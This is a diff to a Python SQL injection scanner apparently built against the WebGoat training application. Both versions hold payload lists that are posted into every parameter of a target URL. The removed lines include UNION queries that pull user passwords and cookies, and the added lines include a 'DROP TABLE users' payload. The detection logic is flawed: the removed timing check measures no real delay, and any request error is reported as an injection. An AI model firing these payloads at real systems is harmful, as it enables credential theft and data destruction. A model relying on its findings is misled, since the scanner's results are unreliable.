@@ -1,82 +1,82 @@
 import requests
-import time
+from urllib.parse import urljoin
 
-# Expanded list of SQL Injection payloads based on the WebGoat scenario
-SQL_PAYLOADS = [
-    "' UNION SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data -- ",
-    "'; SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data --",
-    "' AND '1'='1",
-    "' AND '1'='0",
-    "'; WAITFOR DELAY '0:0:5' --",
-    "'; SELECT IF(1=1, SLEEP(5), 0)--",
-    "' AND SLEEP(5)--",
-    "' OR SLEEP(5) --",
+# Enhanced payloads for testing SQL injection vulnerabilities in WebGoat
+WEBGOAT_SQL_INJECTION_PAYLOADS = [
     "' OR '1'='1' --",
-    "' OR 1=1 --"
+    "' UNION SELECT 1, 'a', 'b', 'c', 'd', 'e' --",
+    "'; DROP TABLE users; --",
+    "' OR '1'='1' /*",
+    "' OR '1'='1' #",
+    "' OR 1=1 --",
+    "' OR 1=1 #",
+    "' OR 1=1 /*",
+    "' OR 'a'='a",
+    "' OR 'a'='a' --",
+    "' OR 'a'='a' /*",
+    "' OR 'a'='a' #",
+    "' OR 1=1; --",
+    "' OR 1=1; #",
+    "' OR 1=1; /*",
+    "' OR 'a'='a'; --",
+    "' OR 'a'='a'; #",
+    "' OR 'a'='a'; /*",
+    "' OR 'a'='a' AND 'b'='b",
+    "' OR 'a'='a' AND 'b'='b' --",
+    "' OR 'a'='a' AND 'b'='b' /*",
+    "' OR 'a'='a' AND 'b'='b' #"
 ]
 
-# List of expected SQL error messages to identify potential vulnerabilities
-EXPECTED_SQL_ERRORS = [
-    "syntax error",
-    "you have an error in your sql syntax",
-    "unclosed quotation mark after the character string",
-    "quoted string not properly terminated",
-    "mysql_fetch_array()",
-    "SQL syntax",
-    "Warning: mysql_fetch_assoc()",
-    "Warning: mysql_fetch_array()",
-    "Warning: mysql_num_rows()",
-    "PDOException",
-    "Microsoft OLE DB Provider for SQL Server",
-    "PostgreSQL query failed"
-]
+def scan_sql_injection(url, params):
+    """
+    This function attempts SQL injection attacks on a given endpoint with
+    specified parameters using various SQL injection payloads.
 
-# Function to handle SQL Injection Scanning
-def scan_sql_injection(url, params, payloads=SQL_PAYLOADS, expected_errors=EXPECTED_SQL_ERRORS):
+    :param url: The full endpoint URL to test
+    :param params: The parameters to inject payloads into
+    :return: A list of detected vulnerabilities or an empty list if none are found
+    """
     vulnerabilities = []
 
-    for param in params:
-        for payload in payloads:
-            # Inject the payload into the parameter
-            test_params = {key: (payload if key == param else value) for key, value in params.items()}
-            #print(f"Testing {url} with {test_params}")  # Logging for debugging
+    for param_name, param_value in params.items():
+        for payload in WEBGOAT_SQL_INJECTION_PAYLOADS:
+            injected_params = params.copy()
+            injected_params[param_name] = payload
 
             try:
-                # Sending the request
-                response = requests.get(url, params=test_params, timeout=10)
+                response = requests.post(url, data=injected_params)
 
-                # Log the HTTP response code for further analysis
-                #print(f"Response Code: {response.status_code}")
-                #print(f"Response Text: {response.text[:500]}...")  # Print first 500 chars of the response
-
-                # Check if response contains SQL errors or abnormal behavior
-                if any(error in response.text.lower() for error in expected_errors):
+                # Check for vulnerability based on response
+                if is_vulnerable(response):
                     vulnerabilities.append({
-                        "issue": "SQL Injection - Error-Based",
-                        "description": f"Possible SQL Injection detected with payload '{payload}' on parameter '{param}'. Error message found in response.",
-                        "severity": "High"
+                        "issue": f"SQL Injection in parameter '{param_name}'",
+                        "description": f"SQL injection vulnerability detected with payload: {payload}",
+                        "severity": "High",
+                        "details": response.text[:500]  # Limit details to first 500 characters
                     })
 
-                # Check for time-based SQL injection by measuring delay
-                elif "sleep" in payload.lower() or "waitfor delay" in payload.lower():
-                    start_time = time.time()
-                    response_time = time.time() - start_time
-                    if response_time > 5:  # Adjust threshold accordingly
-                        vulnerabilities.append({
-                            "issue": "SQL Injection - Time-Based",
-                            "description": f"Possible Time-Based Blind SQL Injection detected with payload '{payload}' on parameter '{param}'. Significant delay observed in response.",
-                            "severity": "High"
-                        })
-
-            except requests.exceptions.Timeout:
-                # If a timeout occurs, assume time-based blind SQLi worked
+            except requests.RequestException as e:
                 vulnerabilities.append({
-                    "issue": "SQL Injection - Time-Based",
-                    "description": f"Possible Time-Based Blind SQL Injection detected with payload '{payload}' on parameter '{param}'. Request timed out, indicating a potential delay-based attack.",
-                    "severity": "High"
+                    "issue": f"SQL Injection in parameter '{param_name}'",
+                    "description": f"Request failed with payload: {payload}",
+                    "severity": "Medium",
+                    "details": f"Request error: {str(e)}"
                 })
 
-            except Exception as e:
-                print(f"Error occurred: {str(e)}")
-
     return vulnerabilities
+
+def is_vulnerable(response):
+    """
+    Check the response for indicators of a successful SQL injection attack.
+
+    :param response: The response object from the HTTP request
+    :return: True if the response indicates a SQL injection vulnerability
+    """
+    error_messages = [
+        "SQL syntax", "mysql_fetch", "MySQL", "PostgreSQL", "ODBC", "sqlite", "ORA-"
+    ]
+
+    for error in error_messages:
+        if error in response.text:
+            return True
+    return False
